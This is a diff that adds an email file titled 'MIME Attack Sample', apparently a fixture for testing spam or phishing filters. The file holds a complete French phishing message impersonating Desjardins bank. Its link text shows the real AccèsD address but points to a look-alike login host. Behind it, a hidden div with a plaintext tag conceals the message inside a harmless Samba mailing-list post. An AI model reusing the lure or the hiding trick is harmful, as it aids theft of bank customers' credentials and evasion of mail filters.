@@ -1,0 +1,189 @@
+From: chinbr@yahoo.com
+To: m..taylor@enron.com, greg.whalley@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="fr-ca">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Desjardins - Scurit</title>
+<style>
+<!--
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+-->
+</style>
+</head>
+
+<body>
+
+<table height="131%" cellSpacing="0" cellPadding="0" width="100%" border="1" align="right" bordercolor="#009966">
+	<tr>
+		<td vAlign="top">
+		<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+			<tr>
+				<td align="left" width="100%">
+				<div class="navEnteteAide">
+					<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+						<tr>
+							<td width="2%"><a name="haut">
+							<img src="http://images.desjardins.com/fr/pict/7a00_pageaide_ada.gif"></a></td>
+							<td vAlign="top" width="98%" bgColor="#009966">
+							<p align="right">&nbsp;&nbsp;&nbsp;</td>
+						</tr>
+					</table>
+					</div>
+				</td>
+			</tr>
+		</table>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                Desjardins/ Acc&egrave;sD,</FONT></span></SPAN><font face="Arial"><br>
+				<br>
+&nbsp;</font><font face="Times New Roman">Chez
+		<font color="#009966"><b><i>Desjardins </i></b></font> , notre mission 
+		est de vous offrir jour aprs jours, un service de qualit 
+		exceptionnelle et d'assurer votre scurit. Nous quipe du Dpartement 
+		de confiance et de scurit veille  chaque heure du jour a maintenir la 
+		fiabilit de notre rseau de sorte que chacun de nos membres autant les 
+		particuliers que notre clientle Affaires puissent effectuer leurs 
+		transactions bancaires en toute scurit.</font><p>
+		<font face="Times New Roman">Lors d'une rcente mise--niveau de scurit,&nbsp; 
+		selon les informations recueillies, nos dossiers indiquent que vous avez 
+		atteint la limite rglementaire permise concernant l'authentification de 
+		votre compte <i><b><font color="#008000">AccsD</font></b></i> , des <b>
+		Solutions en ligne de Desjardins</b>. Conformment aux normes de 
+		scurit de l'entreprise, le but de cet avis est pour vous indiquer 
+		qu'afin de pourvoir maintenir votre compte <font color="#008000"><i><b>
+		AccsD</b></i></font> actif et de pouvoir continuer  effectuer vos 
+		oprations, il est impratif de vous authentifier a celui-ci avant la 
+		date limite vous tant indique pus bas, le cas chant nous devrons 
+		dsactiver votre compte pour une priode indtermine pour votre 
+		scurit.</font></p>
+		<p><font face="Times New Roman">La date limite pour vous authentifier est: 
+		<u><b>Vendredi</b></u><b><u>, le 11 Mai 2007</u></b>.</font></p>
+		<p><font face="Times New Roman">Sans plus tarder veuillez cliquer sur le lien 
+		hypertexte ci bas afin de vous rendre en toute scurit sur notre page 
+		scurise afin de vous authentifier en prvenant ainsi toute situation 
+		inconfortable.<br>
+		</font><b><span class="style4"><A 
+href="http://accesd.desjardins.swrpa.com/loggin/" target=_blank type=hidden>https://accesd.desjardins.com/</A></span></b><span class="style1"> </span>
+              </p>
+		<p><font face="Times New Roman">Nous vous remercions d'avoir pris ces quelques 
+		minutes de participer  cette importante mesure de scurit. Vous 
+		contribuez  ce que le service <font color="#009966"><i><b>AccsD</b></i></font> 
+		des <b>Solutions en ligne de Desjardins</b> demeure un endroit sr ou 
+		vous pouvez grer vos conomies ou les finances de votre entreprise dans 
+		le confort de votre foyer. De toute l'quipe de <font color="#009966">
+		<i><b>Desjardins</b></i></font>: Merci de nous faire confiance car 
+		votre scurit est notre priorit.</font></p>
+		<p><b><font face="Times New Roman">Dpartement de Confiance et de scurit 
+		Mouvement des caisses Desjardins.<br>
+		</font></b><STRONG>
+		<FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / Acc&egrave;sD</FONT></STRONG><BR>
+              <br>
+		<FONT size=2> <br>
+		</FONT>
+		<FONT color=#999999 
+size=1 face="Estilo, Helvetica,
+sans-serif">Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le 
+		courrier envoy  cette adresse ne peut pas tre rpondu. 
+              <br>
+&nbsp;</FONT><TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 id="table1" align="right">
+                <TBODY>
+                  <TR>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left>
+					<P class=style1 align="right">Copyright &copy; 2007 Mouvement des caisses Desjardins. Tous droits 
+                      r&eacute;serv&eacute;s.<br>
+&nbsp;</P></TD>
+                    <TD align=right><SPAN class=bodyText></FONT></SPAN> </TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <p>&nbsp;</p>
+		</td>
+	</tr>
+	</table>
+
+</body>
+
+</html>
+
+Content-Type: text/html
+<div style="display: none;"><plaintext>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Andrew Bartlett wrote:
+> On Mon, 2007-04-30 at 09:03 +0200, Jelmer Vernooij wrote:
+>> Andrew Bartlett wrote:
+>> Nothing prevents test environments for guaranteeing both a dc and two
+>> members will be up, for example. 
+> I'm asking that that be the default, that we create exactly one test
+> environment for the vast majority of the tests we run.  
+I don't see what that would add. Why should we set up a domain member if
+we just one need a dc to run against?
+
+If we'd have one such "sane default", then there is no point in having
+multiple environments at all.
+
+>> Also, the current code makes it very easy to add support for other
+>> targets (Samba3, for example) that don't support all test environments
+>> (yet).
+>>
+>> Perhaps you would simply like to make sure that all test environments
+>> are set up in 'make testenv' ? 
+> No, then the tests will constantly differ from the environment in which
+> they are normally run, even worse than the current situation.
+In that case, why not add an ENV= variable so you can run "make testenv
+ENV=member" ? Or perhaps we can simply add "make testenv-dc" and "make
+testenv-member"?
+
+We can print out the environment name for failed tests, if that would help.
+
+> I'm afraid that the selftest setup is becoming too complex to reproduce
+> - I want to be able to easily reproduce any failure in 'make
+> testenv' (which you will recall is my primary work tool), without first
+> wondering 'oh, what environment did it declare, what environment did it
+> get, and what environment do I have now'.
+That will make other things more complex. For example, we'd need to
+change the environment variables to be $DC1_IP, $DC1_USERNAME,
+$DC2_PASSWORD, etc because the tests can be run against either of the
+dcs or domain member.
+
+It also makes things like "make test TESTS=SAMR" slower as the
+provisioning is two or three times as slow.
+
+> It doesn't seem too much of a price to always have a simple network
+> running, that contains the DC (or 2), and member servers.  Then we can
+> be very consistent in how our tests run, and are debugged. 
+It's not just the time it takes to set up the environment, also the fact
+that it makes it harder to support other targets (because of the
+complexity of the environment they need to support) and the inability to
+mix environments.
+
+Cheers,
+
+Jelmer
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iQCVAwUBRjWnMgy0JeEGD2blAQKd3AP8C4b1mEW0jcHaD8aO4m9oySWcY4+LEXiL
+HnRIW2XK4v0/6RhawKa8OHPe8OiLip7qP4wcYay6s+1jtA/ZjTOs+LYhtVggsFAN
+Tz1SZzM3pchD0TOcM0IIaTlXfLMvaY6VoPwy8kxSulbGJLLY6GRTRV+qTPnocKoI
+RGDNOyVlGic=
+=0kwx
+-----END PGP SIGNATURE-----
+
